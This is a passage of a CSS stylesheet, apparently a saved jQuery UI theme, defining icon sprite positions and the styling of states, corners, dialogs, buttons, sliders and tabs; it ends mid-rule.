                outline-color: invert;
                outline-width: medium;
            }
            .ui-state-highlight {
                border-bottom: #e8e1b5 1px solid;
                border-left: #e8e1b5 1px solid;
                background: /*savepage-url=images/ui-bg_glass_55_fcf0ba_1x400.png*/ url() #fcf0ba repeat-x 50% 50%;
                color: #363636;
                border-top: #e8e1b5 1px solid;
                border-right: #e8e1b5 1px solid;
            }
            .ui-widget-content .ui-state-highlight {
                border-bottom: #e8e1b5 1px solid;
                border-left: #e8e1b5 1px solid;
                background: /*savepage-url=images/ui-bg_glass_55_fcf0ba_1x400.png*/ url() #fcf0ba repeat-x 50% 50%;
                color: #363636;
                border-top: #e8e1b5 1px solid;
                border-right: #e8e1b5 1px solid;
            }
            .ui-widget-header .ui-state-highlight {
                border-bottom: #e8e1b5 1px solid;
                border-left: #e8e1b5 1px solid;
                background: /*savepage-url=images/ui-bg_glass_55_fcf0ba_1x400.png*/ url() #fcf0ba repeat-x 50% 50%;
                color: #363636;
                border-top: #e8e1b5 1px solid;
                border-right: #e8e1b5 1px solid;
            }
            .ui-state-highlight A {
                color: #363636;
            }
            .ui-widget-content .ui-state-highlight A {
                color: #363636;
            }
            .ui-widget-header .ui-state-highlight A {
                color: #363636;
            }
            .ui-state-error {
                border-bottom: #e3a345 1px solid;
                border-left: #e3a345 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_95_ffedad_1x100.png*/ url() #ffedad repeat-x 50% top;
                color: #cd5c0a;
                border-top: #e3a345 1px solid;
                border-right: #e3a345 1px solid;
            }
            .ui-widget-content .ui-state-error {
                border-bottom: #e3a345 1px solid;
                border-left: #e3a345 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_95_ffedad_1x100.png*/ url() #ffedad repeat-x 50% top;
                color: #cd5c0a;
                border-top: #e3a345 1px solid;
                border-right: #e3a345 1px solid;
            }
            .ui-widget-header .ui-state-error {
                border-bottom: #e3a345 1px solid;
                border-left: #e3a345 1px solid;
                background: /*savepage-url=images/ui-bg_highlight-soft_95_ffedad_1x100.png*/ url() #ffedad repeat-x 50% top;
                color: #cd5c0a;
                border-top: #e3a345 1px solid;
                border-right: #e3a345 1px solid;
            }
            .ui-state-error A {
                color: #cd5c0a;
            }
            .ui-widget-content .ui-state-error A {
                color: #cd5c0a;
            }
            .ui-widget-header .ui-state-error A {
                color: #cd5c0a;
            }
            .ui-state-error-text {
                color: #cd5c0a;
            }
            .ui-widget-content .ui-state-error-text {
                color: #cd5c0a;
            }
            .ui-widget-header .ui-state-error-text {
                color: #cd5c0a;
            }
            .ui-priority-primary {
                font-weight: bold;
            }
            .ui-widget-content .ui-priority-primary {
                font-weight: bold;
            }
            .ui-widget-header .ui-priority-primary {
                font-weight: bold;
            }
            .ui-priority-secondary {
                filter: Alpha(Opacity=70);
                font-weight: normal;
                opacity: 0.7;
            }
            .ui-widget-content .ui-priority-secondary {
                filter: Alpha(Opacity=70);
                font-weight: normal;
                opacity: 0.7;
            }
            .ui-widget-header .ui-priority-secondary {
                filter: Alpha(Opacity=70);
                font-weight: normal;
                opacity: 0.7;
            }
            .ui-state-disabled {
                background-image: none;
                filter: Alpha(Opacity=35);
                opacity: 0.35;
            }
            .ui-widget-content .ui-state-disabled {
                background-image: none;
                filter: Alpha(Opacity=35);
                opacity: 0.35;
            }
            .ui-widget-header .ui-state-disabled {
                background-image: none;
                filter: Alpha(Opacity=35);
                opacity: 0.35;
            }
            .ui-icon {
                background-image: /*savepage-url=images/ui-icons_808080_256x240.png*/ url();
                width: 16px;
                height: 16px;
            }
            .ui-widget-content .ui-icon {
                background-image: /*savepage-url=images/ui-icons_808080_256x240.png*/ url();
            }
            .ui-widget-header .ui-icon {
                background-image: /*savepage-url=images/ui-icons_847e71_256x240.png*/ url();
            }
            .ui-state-default .ui-icon {
                background-image: /*savepage-url=images/ui-icons_eeeeee_256x240.png*/ url();
            }
            .ui-state-hover .ui-icon {
                background-image: /*savepage-url=images/ui-icons_ffffff_256x240.png*/ url();
            }
            .ui-state-focus .ui-icon {
                background-image: /*savepage-url=images/ui-icons_ffffff_256x240.png*/ url();
            }
            .ui-state-active .ui-icon {
                background-image: /*savepage-url=images/ui-icons_8dc262_256x240.png*/ url();
            }
            .ui-state-highlight .ui-icon {
                background-image: /*savepage-url=images/ui-icons_8dc262_256x240.png*/ url();
            }
            .ui-state-error .ui-icon {
                background-image: /*savepage-url=images/ui-icons_cd0a0a_256x240.png*/ url();
            }
            .ui-state-error-text .ui-icon {
                background-image: /*savepage-url=images/ui-icons_cd0a0a_256x240.png*/ url();
            }
            .ui-icon-carat-1-n {
                background-position: 0px 0px;
            }
            .ui-icon-carat-1-ne {
                background-position: -16px 0px;
            }
            .ui-icon-carat-1-e {
                background-position: -32px 0px;
            }
            .ui-icon-carat-1-se {
                background-position: -48px 0px;
            }
            .ui-icon-carat-1-s {
                background-position: -64px 0px;
            }
            .ui-icon-carat-1-sw {
                background-position: -80px 0px;
            }
            .ui-icon-carat-1-w {
                background-position: -96px 0px;
            }
            .ui-icon-carat-1-nw {
                background-position: -112px 0px;
            }
            .ui-icon-carat-2-n-s {
                background-position: -128px 0px;
            }
            .ui-icon-carat-2-e-w {
                background-position: -144px 0px;
            }
            .ui-icon-triangle-1-n {
                background-position: 0px -16px;
            }
            .ui-icon-triangle-1-ne {
                background-position: -16px -16px;
            }
            .ui-icon-triangle-1-e {
                background-position: -32px -16px;
            }
            .ui-icon-triangle-1-se {
                background-position: -48px -16px;
            }
            .ui-icon-triangle-1-s {
                background-position: -64px -16px;
            }
            .ui-icon-triangle-1-sw {
                background-position: -80px -16px;
            }
            .ui-icon-triangle-1-w {
                background-position: -96px -16px;
            }
            .ui-icon-triangle-1-nw {
                background-position: -112px -16px;
            }
            .ui-icon-triangle-2-n-s {
                background-position: -128px -16px;
            }
            .ui-icon-triangle-2-e-w {
                background-position: -144px -16px;
            }
            .ui-icon-arrow-1-n {
                background-position: 0px -32px;
            }
            .ui-icon-arrow-1-ne {
                background-position: -16px -32px;
            }
            .ui-icon-arrow-1-e {
                background-position: -32px -32px;
            }
            .ui-icon-arrow-1-se {
                background-position: -48px -32px;
            }
            .ui-icon-arrow-1-s {
                background-position: -64px -32px;
            }
            .ui-icon-arrow-1-sw {
                background-position: -80px -32px;
            }
            .ui-icon-arrow-1-w {
                background-position: -96px -32px;
            }
            .ui-icon-arrow-1-nw {
                background-position: -112px -32px;
            }
            .ui-icon-arrow-2-n-s {
                background-position: -128px -32px;
            }
            .ui-icon-arrow-2-ne-sw {
                background-position: -144px -32px;
            }
            .ui-icon-arrow-2-e-w {
                background-position: -160px -32px;
            }
            .ui-icon-arrow-2-se-nw {
                background-position: -176px -32px;
            }
            .ui-icon-arrowstop-1-n {
                background-position: -192px -32px;
            }
            .ui-icon-arrowstop-1-e {
                background-position: -208px -32px;
            }
            .ui-icon-arrowstop-1-s {
                background-position: -224px -32px;
            }
            .ui-icon-arrowstop-1-w {
                background-position: -240px -32px;
            }
            .ui-icon-arrowthick-1-n {
                background-position: 0px -48px;
            }
            .ui-icon-arrowthick-1-ne {
                background-position: -16px -48px;
            }
            .ui-icon-arrowthick-1-e {
                background-position: -32px -48px;
            }
            .ui-icon-arrowthick-1-se {
                background-position: -48px -48px;
            }
            .ui-icon-arrowthick-1-s {
                background-position: -64px -48px;
            }
            .ui-icon-arrowthick-1-sw {
                background-position: -80px -48px;
            }
            .ui-icon-arrowthick-1-w {
                background-position: -96px -48px;
            }
            .ui-icon-arrowthick-1-nw {
                background-position: -112px -48px;
            }
            .ui-icon-arrowthick-2-n-s {
                background-position: -128px -48px;
            }
            .ui-icon-arrowthick-2-ne-sw {
                background-position: -144px -48px;
            }
            .ui-icon-arrowthick-2-e-w {
                background-position: -160px -48px;
            }
            .ui-icon-arrowthick-2-se-nw {
                background-position: -176px -48px;
            }
            .ui-icon-arrowthickstop-1-n {
                background-position: -192px -48px;
            }
            .ui-icon-arrowthickstop-1-e {
                background-position: -208px -48px;
            }
            .ui-icon-arrowthickstop-1-s {
                background-position: -224px -48px;
            }
            .ui-icon-arrowthickstop-1-w {
                background-position: -240px -48px;
            }
            .ui-icon-arrowreturnthick-1-w {
                background-position: 0px -64px;
            }
            .ui-icon-arrowreturnthick-1-n {
                background-position: -16px -64px;
            }
            .ui-icon-arrowreturnthick-1-e {
                background-position: -32px -64px;
            }
            .ui-icon-arrowreturnthick-1-s {
                background-position: -48px -64px;
            }
            .ui-icon-arrowreturn-1-w {
                background-position: -64px -64px;
            }
            .ui-icon-arrowreturn-1-n {
                background-position: -80px -64px;
            }
            .ui-icon-arrowreturn-1-e {
                background-position: -96px -64px;
            }
            .ui-icon-arrowreturn-1-s {
                background-position: -112px -64px;
            }
            .ui-icon-arrowrefresh-1-w {
                background-position: -128px -64px;
            }
            .ui-icon-arrowrefresh-1-n {
                background-position: -144px -64px;
            }
            .ui-icon-arrowrefresh-1-e {
                background-position: -160px -64px;
            }
            .ui-icon-arrowrefresh-1-s {
                background-position: -176px -64px;
            }
            .ui-icon-arrow-4 {
                background-position: 0px -80px;
            }
            .ui-icon-arrow-4-diag {
                background-position: -16px -80px;
            }
            .ui-icon-extlink {
                background-position: -32px -80px;
            }
            .ui-icon-newwin {
                background-position: -48px -80px;
            }
            .ui-icon-refresh {
                background-position: -64px -80px;
            }
            .ui-icon-shuffle {
                background-position: -80px -80px;
            }
            .ui-icon-transfer-e-w {
                background-position: -96px -80px;
            }
            .ui-icon-transferthick-e-w {
                background-position: -112px -80px;
            }
            .ui-icon-folder-collapsed {
                background-position: 0px -96px;
            }
            .ui-icon-folder-open {
                background-position: -16px -96px;
            }
            .ui-icon-document {
                background-position: -32px -96px;
            }
            .ui-icon-document-b {
                background-position: -48px -96px;
            }
            .ui-icon-note {
                background-position: -64px -96px;
            }
            .ui-icon-mail-closed {
                background-position: -80px -96px;
            }
            .ui-icon-mail-open {
                background-position: -96px -96px;
            }
            .ui-icon-suitcase {
                background-position: -112px -96px;
            }
            .ui-icon-comment {
                background-position: -128px -96px;
            }
            .ui-icon-person {
                background-position: -144px -96px;
            }
            .ui-icon-print {
                background-position: -160px -96px;
            }
            .ui-icon-trash {
                background-position: -176px -96px;
            }
            .ui-icon-locked {
                background-position: -192px -96px;
            }
            .ui-icon-unlocked {
                background-position: -208px -96px;
            }
            .ui-icon-bookmark {
                background-position: -224px -96px;
            }
            .ui-icon-tag {
                background-position: -240px -96px;
            }
            .ui-icon-home {
                background-position: 0px -112px;
            }
            .ui-icon-flag {
                background-position: -16px -112px;
            }
            .ui-icon-calendar {
                background-position: -32px -112px;
            }
            .ui-icon-cart {
                background-position: -48px -112px;
            }
            .ui-icon-pencil {
                background-position: -64px -112px;
            }
            .ui-icon-clock {
                background-position: -80px -112px;
            }
            .ui-icon-disk {
                background-position: -96px -112px;
            }
            .ui-icon-calculator {
                background-position: -112px -112px;
            }
            .ui-icon-zoomin {
                background-position: -128px -112px;
            }
            .ui-icon-zoomout {
                background-position: -144px -112px;
            }
            .ui-icon-search {
                background-position: -160px -112px;
            }
            .ui-icon-wrench {
                background-position: -176px -112px;
            }
            .ui-icon-gear {
                background-position: -192px -112px;
            }
            .ui-icon-heart {
                background-position: -208px -112px;
            }
            .ui-icon-star {
                background-position: -224px -112px;
            }
            .ui-icon-link {
                background-position: -240px -112px;
            }
            .ui-icon-cancel {
                background-position: 0px -128px;
            }
            .ui-icon-plus {
                background-position: -16px -128px;
            }
            .ui-icon-plusthick {
                background-position: -32px -128px;
            }
            .ui-icon-minus {
                background-position: -48px -128px;
            }
            .ui-icon-minusthick {
                background-position: -64px -128px;
            }
            .ui-icon-close {
                background-position: -80px -128px;
            }
            .ui-icon-closethick {
                background-position: -96px -128px;
            }
            .ui-icon-key {
                background-position: -112px -128px;
            }
            .ui-icon-lightbulb {
                background-position: -128px -128px;
            }
            .ui-icon-scissors {
                background-position: -144px -128px;
            }
            .ui-icon-clipboard {
                background-position: -160px -128px;
            }
            .ui-icon-copy {
                background-position: -176px -128px;
            }
            .ui-icon-contact {
                background-position: -192px -128px;
            }
            .ui-icon-image {
                background-position: -208px -128px;
            }
            .ui-icon-video {
                background-position: -224px -128px;
            }
            .ui-icon-script {
                background-position: -240px -128px;
            }
            .ui-icon-alert {
                background-position: 0px -144px;
            }
            .ui-icon-info {
                background-position: -16px -144px;
            }
            .ui-icon-notice {
                background-position: -32px -144px;
            }
            .ui-icon-help {
                background-position: -48px -144px;
            }
            .ui-icon-check {
                background-position: -64px -144px;
            }
            .ui-icon-bullet {
                background-position: -80px -144px;
            }
            .ui-icon-radio-off {
                background-position: -96px -144px;
            }
            .ui-icon-radio-on {
                background-position: -112px -144px;
            }
            .ui-icon-pin-w {
                background-position: -128px -144px;
            }
            .ui-icon-pin-s {
                background-position: -144px -144px;
            }
            .ui-icon-play {
                background-position: 0px -160px;
            }
            .ui-icon-pause {
                background-position: -16px -160px;
            }
            .ui-icon-seek-next {
                background-position: -32px -160px;
            }
            .ui-icon-seek-prev {
                background-position: -48px -160px;
            }
            .ui-icon-seek-end {
                background-position: -64px -160px;
            }
            .ui-icon-seek-start {
                background-position: -80px -160px;
            }
            .ui-icon-seek-first {
                background-position: -80px -160px;
            }
            .ui-icon-stop {
                background-position: -96px -160px;
            }
            .ui-icon-eject {
                background-position: -112px -160px;
            }
            .ui-icon-volume-off {
                background-position: -128px -160px;
            }
            .ui-icon-volume-on {
                background-position: -144px -160px;
            }
            .ui-icon-power {
                background-position: 0px -176px;
            }
            .ui-icon-signal-diag {
                background-position: -16px -176px;
            }
            .ui-icon-signal {
                background-position: -32px -176px;
            }
            .ui-icon-battery-0 {
                background-position: -48px -176px;
            }
            .ui-icon-battery-1 {
                background-position: -64px -176px;
            }
            .ui-icon-battery-2 {
                background-position: -80px -176px;
            }
            .ui-icon-battery-3 {
                background-position: -96px -176px;
            }
            .ui-icon-circle-plus {
                background-position: 0px -192px;
            }
            .ui-icon-circle-minus {
                background-position: -16px -192px;
            }
            .ui-icon-circle-close {
                background-position: -32px -192px;
            }
            .ui-icon-circle-triangle-e {
                background-position: -48px -192px;
            }
            .ui-icon-circle-triangle-s {
                background-position: -64px -192px;
            }
            .ui-icon-circle-triangle-w {
                background-position: -80px -192px;
            }
            .ui-icon-circle-triangle-n {
                background-position: -96px -192px;
            }
            .ui-icon-circle-arrow-e {
                background-position: -112px -192px;
            }
            .ui-icon-circle-arrow-s {
                background-position: -128px -192px;
            }
            .ui-icon-circle-arrow-w {
                background-position: -144px -192px;
            }
            .ui-icon-circle-arrow-n {
                background-position: -160px -192px;
            }
            .ui-icon-circle-zoomin {
                background-position: -176px -192px;
            }
            .ui-icon-circle-zoomout {
                background-position: -192px -192px;
            }
            .ui-icon-circle-check {
                background-position: -208px -192px;
            }
            .ui-icon-circlesmall-plus {
                background-position: 0px -208px;
            }
            .ui-icon-circlesmall-minus {
                background-position: -16px -208px;
            }
            .ui-icon-circlesmall-close {
                background-position: -32px -208px;
            }
            .ui-icon-squaresmall-plus {
                background-position: -48px -208px;
            }
            .ui-icon-squaresmall-minus {
                background-position: -64px -208px;
            }
            .ui-icon-squaresmall-close {
                background-position: -80px -208px;
            }
            .ui-icon-grip-dotted-vertical {
                background-position: 0px -224px;
            }
            .ui-icon-grip-dotted-horizontal {
                background-position: -16px -224px;
            }
            .ui-icon-grip-solid-vertical {
                background-position: -32px -224px;
            }
            .ui-icon-grip-solid-horizontal {
                background-position: -48px -224px;
            }
            .ui-icon-gripsmall-diagonal-se {
                background-position: -64px -224px;
            }
            .ui-icon-grip-diagonal-se {
                background-position: -80px -224px;
            }
            .ui-corner-all {
                -moz-border-radius-topleft: 6px;
                -webkit-border-top-left-radius: 6px;
                -khtml-border-top-left-radius: 6px;
                border-top-left-radius: 6px;
            }
            .ui-corner-top {
                -moz-border-radius-topleft: 6px;
                -webkit-border-top-left-radius: 6px;
                -khtml-border-top-left-radius: 6px;
                border-top-left-radius: 6px;
            }
            .ui-corner-left {
                -moz-border-radius-topleft: 6px;
                -webkit-border-top-left-radius: 6px;
                -khtml-border-top-left-radius: 6px;
                border-top-left-radius: 6px;
            }
            .ui-corner-tl {
                -moz-border-radius-topleft: 6px;
                -webkit-border-top-left-radius: 6px;
                -khtml-border-top-left-radius: 6px;
                border-top-left-radius: 6px;
            }
            .ui-corner-all {
                -moz-border-radius-topright: 6px;
                -webkit-border-top-right-radius: 6px;
                -khtml-border-top-right-radius: 6px;
                border-top-right-radius: 6px;
            }
            .ui-corner-top {
                -moz-border-radius-topright: 6px;
                -webkit-border-top-right-radius: 6px;
                -khtml-border-top-right-radius: 6px;
                border-top-right-radius: 6px;
            }
            .ui-corner-right {
                -moz-border-radius-topright: 6px;
                -webkit-border-top-right-radius: 6px;
                -khtml-border-top-right-radius: 6px;
                border-top-right-radius: 6px;
            }
            .ui-corner-tr {
                -moz-border-radius-topright: 6px;
                -webkit-border-top-right-radius: 6px;
                -khtml-border-top-right-radius: 6px;
                border-top-right-radius: 6px;
            }
            .ui-corner-all {
                -moz-border-radius-bottomleft: 6px;
                -webkit-border-bottom-left-radius: 6px;
                -khtml-border-bottom-left-radius: 6px;
                border-bottom-left-radius: 6px;
            }
            .ui-corner-bottom {
                -moz-border-radius-bottomleft: 6px;
                -webkit-border-bottom-left-radius: 6px;
                -khtml-border-bottom-left-radius: 6px;
                border-bottom-left-radius: 6px;
            }
            .ui-corner-left {
                -moz-border-radius-bottomleft: 6px;
                -webkit-border-bottom-left-radius: 6px;
                -khtml-border-bottom-left-radius: 6px;
                border-bottom-left-radius: 6px;
            }
            .ui-corner-bl {
                -moz-border-radius-bottomleft: 6px;
                -webkit-border-bottom-left-radius: 6px;
                -khtml-border-bottom-left-radius: 6px;
                border-bottom-left-radius: 6px;
            }
            .ui-corner-all {
                -moz-border-radius-bottomright: 6px;
                -webkit-border-bottom-right-radius: 6px;
                -khtml-border-bottom-right-radius: 6px;
                border-bottom-right-radius: 6px;
            }
            .ui-corner-bottom {
                -moz-border-radius-bottomright: 6px;
                -webkit-border-bottom-right-radius: 6px;
                -khtml-border-bottom-right-radius: 6px;
                border-bottom-right-radius: 6px;
            }
            .ui-corner-right {
                -moz-border-radius-bottomright: 6px;
                -webkit-border-bottom-right-radius: 6px;
                -khtml-border-bottom-right-radius: 6px;
                border-bottom-right-radius: 6px;
            }
            .ui-corner-br {
                -moz-border-radius-bottomright: 6px;
                -webkit-border-bottom-right-radius: 6px;
                -khtml-border-bottom-right-radius: 6px;
                border-bottom-right-radius: 6px;
            }
            .ui-widget-overlay {
                filter: Alpha(Opacity=90);
                background: /*savepage-url=images/ui-bg_inset-soft_15_2b2922_1x100.png*/ url() #2b2922 repeat-x 50% bottom;
                opacity: 0.9;
            }
            .ui-widget-shadow {
                filter: Alpha(Opacity=20);
                padding-bottom: 12px;
                margin: -12px 0px 0px -12px;
                padding-left: 12px;
                padding-right: 12px;
                background: /*savepage-url=images/ui-bg_highlight-hard_95_cccccc_1x100.png*/ url() #cccccc repeat-x 50% top;
                padding-top: 12px;
                opacity: 0.2;
                -moz-border-radius: 10px;
                -khtml-border-radius: 10px;
                -webkit-border-radius: 10px;
                border-radius: 10px;
            }
            .ui-resizable {
                position: relative;
            }
            .ui-resizable-handle {
                z-index: 99999;
                position: absolute;
                display: block;
                font-size: 0px;
            }
            .ui-resizable-disabled .ui-resizable-handle {
                display: none;
            }
            .ui-resizable-autohide .ui-resizable-handle {
                display: none;
            }
            .ui-resizable-n {
                width: 100%;
                height: 7px;
                top: -5px;
                cursor: n-resize;
                left: 0px;
            }
            .ui-resizable-s {
                width: 100%;
                bottom: -5px;
                height: 7px;
                cursor: s-resize;
                left: 0px;
            }
            .ui-resizable-e {
                width: 7px;
                height: 100%;
                top: 0px;
                cursor: e-resize;
                right: -5px;
            }
            .ui-resizable-w {
                width: 7px;
                height: 100%;
                top: 0px;
                cursor: w-resize;
                left: -5px;
            }
            .ui-resizable-se {
                width: 12px;
                bottom: 1px;
                height: 12px;
                cursor: se-resize;
                right: 1px;
            }
            .ui-resizable-sw {
                width: 9px;
                bottom: -5px;
                height: 9px;
                cursor: sw-resize;
                left: -5px;
            }
            .ui-resizable-nw {
                width: 9px;
                height: 9px;
                top: -5px;
                cursor: nw-resize;
                left: -5px;
            }
            .ui-resizable-ne {
                width: 9px;
                height: 9px;
                top: -5px;
                cursor: ne-resize;
                right: -5px;
            }
            .ui-selectable-helper {
                z-index: 100;
                border-bottom: black 1px dotted;
                position: absolute;
                border-left: black 1px dotted;
                border-top: black 1px dotted;
                border-right: black 1px dotted;
            }
            .ui-accordion {
                width: 100%;
            }
            .ui-accordion .ui-accordion-header {
                position: relative;
                margin-top: 1px;
                zoom: 1;
                cursor: pointer;
            }
            .ui-accordion .ui-accordion-li-fix {
                display: inline;
            }
            .ui-accordion .ui-accordion-header-active {
                border-bottom: 0px;
            }
            .ui-accordion .ui-accordion-header A {
                padding-bottom: 0.5em;
                padding-left: 0.7em;
                padding-right: 0.5em;
                display: block;
                font-size: 1em;
                padding-top: 0.5em;
            }
            .ui-accordion-icons .ui-accordion-header A {
                padding-left: 2.2em;
            }
            .ui-accordion .ui-accordion-header .ui-icon {
                position: absolute;
                margin-top: -8px;
                top: 50%;
                left: 0.5em;
            }
            .ui-accordion .ui-accordion-content {
                position: relative;
                padding-bottom: 1em;
                margin-top: -2px;
                padding-left: 2.2em;
                padding-right: 2.2em;
                zoom: 1;
                display: none;
                margin-bottom: 2px;
                overflow: auto;
                border-top: 0px;
                top: 1px;
                padding-top: 1em;
            }
            .ui-accordion .ui-accordion-content-active {
                display: block;
            }
            .ui-autocomplete {
                position: absolute;
                cursor: default;
            }
            * HTML .ui-autocomplete {
                width: 1px;
            }
            .ui-menu {
                padding-bottom: 2px;
                list-style-type: none;
                margin: 0px;
                padding-left: 2px;
                padding-right: 2px;
                display: block;
                float: left;
                padding-top: 2px;
            }
            .ui-menu .ui-menu {
                margin-top: -3px;
            }
            .ui-menu .ui-menu-item {
                padding-bottom: 0px;
                margin: 0px;
                padding-left: 0px;
                width: 100%;
                padding-right: 0px;
                zoom: 1;
                float: left;
                clear: left;
                padding-top: 0px;
            }
            .ui-menu .ui-menu-item A {
                padding-bottom: 0.2em;
                line-height: 1.5;
                padding-left: 0.4em;
                padding-right: 0.4em;
                zoom: 1;
                display: block;
                text-decoration: none;
                padding-top: 0.2em;
            }
            .ui-menu .ui-menu-item A.ui-state-hover {
                margin: -1px;
                font-weight: normal;
            }
            .ui-menu .ui-menu-item A.ui-state-active {
                margin: -1px;
                font-weight: normal;
            }
            .ui-button {
                position: relative;
                text-align: center;
                padding-bottom: 0px;
                padding-left: 0px;
                padding-right: 0px;
                zoom: 1;
                display: inline-block;
                overflow: visible;
                cursor: pointer;
                margin-right: 0.1em;
                text-decoration: none !important;
                padding-top: 0px;
            }
            .ui-button-icon-only {
                width: 2.2em;
            }
            BUTTON.ui-button-icon-only {
                width: 2.4em;
            }
            .ui-button-icons-only {
                width: 3.4em;
            }
            BUTTON.ui-button-icons-only {
                width: 3.7em;
            }
            .ui-button .ui-button-text {
                line-height: 1.4;
                display: block;
            }
            .ui-button-text-only .ui-button-text {
                padding-bottom: 0.4em;
                padding-left: 1em;
                padding-right: 1em;
                padding-top: 0.4em;
            }
            .ui-button-icon-only .ui-button-text {
                padding-bottom: 0.4em;
                text-indent: -1342177.28px;
                padding-left: 0.4em;
                padding-right: 0.4em;
                padding-top: 0.4em;
            }
            .ui-button-icons-only .ui-button-text {
                padding-bottom: 0.4em;
                text-indent: -1342177.28px;
                padding-left: 0.4em;
                padding-right: 0.4em;
                padding-top: 0.4em;
            }
            .ui-button-text-icon-primary .ui-button-text {
                padding-bottom: 0.4em;
                padding-left: 2.1em;
                padding-right: 1em;
                padding-top: 0.4em;
            }
            .ui-button-text-icons .ui-button-text {
                padding-bottom: 0.4em;
                padding-left: 2.1em;
                padding-right: 1em;
                padding-top: 0.4em;
            }
            .ui-button-text-icon-secondary .ui-button-text {
                padding-bottom: 0.4em;
                padding-left: 1em;
                padding-right: 2.1em;
                padding-top: 0.4em;
            }
            .ui-button-text-icons .ui-button-text {
                padding-bottom: 0.4em;
                padding-left: 1em;
                padding-right: 2.1em;
                padding-top: 0.4em;
            }
            .ui-button-text-icons .ui-button-text {
                padding-left: 2.1em;
                padding-right: 2.1em;
            }
            INPUT.ui-button {
                padding-bottom: 0.4em;
                padding-left: 1em;
                padding-right: 1em;
                padding-top: 0.4em;
            }
            .ui-button-icon-only .ui-icon {
                position: absolute;
                margin-top: -8px;
                top: 50%;
            }
            .ui-button-text-icon-primary .ui-icon {
                position: absolute;
                margin-top: -8px;
                top: 50%;
            }
            .ui-button-text-icon-secondary .ui-icon {
                position: absolute;
                margin-top: -8px;
                top: 50%;
            }
            .ui-button-text-icons .ui-icon {
                position: absolute;
                margin-top: -8px;
                top: 50%;
            }
            .ui-button-icons-only .ui-icon {
                position: absolute;
                margin-top: -8px;
                top: 50%;
            }
            .ui-button-icon-only .ui-icon {
                margin-left: -8px;
                left: 50%;
            }
            .ui-button-text-icon-primary .ui-button-icon-primary {
                left: 0.5em;
            }
            .ui-button-text-icons .ui-button-icon-primary {
                left: 0.5em;
            }
            .ui-button-icons-only .ui-button-icon-primary {
                left: 0.5em;
            }
            .ui-button-text-icon-secondary .ui-button-icon-secondary {
                right: 0.5em;
            }
            .ui-button-text-icons .ui-button-icon-secondary {
                right: 0.5em;
            }
            .ui-button-icons-only .ui-button-icon-secondary {
                right: 0.5em;
            }
            .ui-button-text-icons .ui-button-icon-secondary {
                right: 0.5em;
            }
            .ui-button-icons-only .ui-button-icon-secondary {
                right: 0.5em;
            }
            .ui-buttonset {
                margin-right: 7px;
            }
            .ui-buttonset .ui-button {
                margin-left: 0px;
                margin-right: -0.3em;
            }
            BUTTON.ui-button:unknown {
                border-bottom: 0px;
                border-left: 0px;
                padding-bottom: 0px;
                padding-left: 0px;
                padding-right: 0px;
                border-top: 0px;
                border-right: 0px;
                padding-top: 0px;
            }
            .ui-dialog {
                position: absolute;
                padding-bottom: 0.2em;
                padding-left: 0.2em;
                width: 300px;
                padding-right: 0.2em;
                overflow: hidden;
                padding-top: 0.2em;
            }
            .ui-dialog .ui-dialog-titlebar {
                position: relative;
                padding-bottom: 0.4em;
                padding-left: 1em;
                padding-right: 1em;
                padding-top: 0.4em;
            }
            .ui-dialog .ui-dialog-title {
                margin: 0.1em 16px 0.1em 0px;
                float: left;
            }
            .ui-dialog .ui-dialog-titlebar-close {
                position: absolute;
                padding-bottom: 1px;
                margin: -10px 0px 0px;
                padding-left: 1px;
                width: 19px;
                padding-right: 1px;
                height: 18px;
                top: 50%;
                right: 0.3em;
                padding-top: 1px;
            }
            .ui-dialog .ui-dialog-titlebar-close SPAN {
                margin: 1px;
                display: block;
            }
            .ui-dialog .ui-dialog-titlebar-close:hover {
                padding-bottom: 0px;
                padding-left: 0px;
                padding-right: 0px;
                padding-top: 0px;
            }
            .ui-dialog .ui-dialog-titlebar-close:focus {
                padding-bottom: 0px;
                padding-left: 0px;
                padding-right: 0px;
                padding-top: 0px;
            }
            .ui-dialog .ui-dialog-content {
                border-bottom: 0px;
                position: relative;
                border-left: 0px;
                padding-bottom: 0.5em;
                padding-left: 1em;
                padding-right: 1em;
                zoom: 1;
                background: none transparent scroll repeat 0% 0%;
                overflow: auto;
                border-top: 0px;
                border-right: 0px;
                padding-top: 0.5em;
            }
            .ui-dialog .ui-dialog-buttonpane {
                background-image: none;
                text-align: left;
                padding-bottom: 0.5em;
                border-right-width: 0px;
                margin: 0.5em 0px 0px;
                padding-left: 0.4em;
                padding-right: 1em;
                border-top-width: 1px;
                border-bottom-width: 0px;
                border-left-width: 0px;
                padding-top: 0.3em;
            }
            .ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset {
                float: right;
            }
            .ui-dialog .ui-dialog-buttonpane BUTTON {
                margin: 0.5em 0.4em 0.5em 0px;
                cursor: pointer;
            }
            .ui-dialog .ui-resizable-se {
                width: 14px;
                bottom: 3px;
                height: 14px;
                right: 3px;
            }
            .ui-draggable .ui-dialog-titlebar {
                cursor: move;
            }
            .ui-slider {
                position: relative;
                text-align: left;
            }
            .ui-slider .ui-slider-handle {
                z-index: 2;
                position: absolute;
                width: 1.2em;
                height: 1.2em;
                cursor: default;
            }
            .ui-slider .ui-slider-range {
                z-index: 1;
                border-bottom: 0px;
                position: absolute;
                border-left: 0px;
                display: block;
                background-position: 0px 0px;
                font-size: 0.7em;
                border-top: 0px;
                border-right: 0px;
            }
            .ui-slider-horizontal {
                height: 0.8em;
            }
            .ui-slider-horizontal .ui-slider-handle {
                margin-left: -0.6em;
                top: -0.3em;
            }
            .ui-slider-horizontal .ui-slider-range {
                height: 100%;
                top: 0px;
            }
            .ui-slider-horizontal .ui-slider-range-min {
                left: 0px;
            }
            .ui-slider-horizontal .ui-slider-range-max {
                right: 0px;
            }
            .ui-slider-vertical {
                width: 0.8em;
                height: 100px;
            }
            .ui-slider-vertical .ui-slider-handle {
                margin-bottom: -0.6em;
                margin-left: 0px;
                left: -0.3em;
            }
            .ui-slider-vertical .ui-slider-range {
                width: 100%;
                left: 0px;
            }
            .ui-slider-vertical .ui-slider-range-min {
                bottom: 0px;
            }
            .ui-slider-vertical .ui-slider-range-max {
                top: 0px;
            }
            .ui-tabs {
                position: relative;
                padding-bottom: 0.2em;
                padding-left: 0.2em;
                padding-right: 0.2em;
                zoom: 1;
                padding-top: 0.2em;
            }
            .ui-tabs .ui-tabs-nav {
                padding-bottom: 0px;
                margin: 0px;
                padding-left: 0.2em;
                padding-right: 0.2em;
                padding-top: 0.2em;
            }
            .ui-tabs .ui-tabs-nav LI {
                border-bottom: 0px;
                position: relative;
                padding-bottom: 0px;
                list-style-type: none;
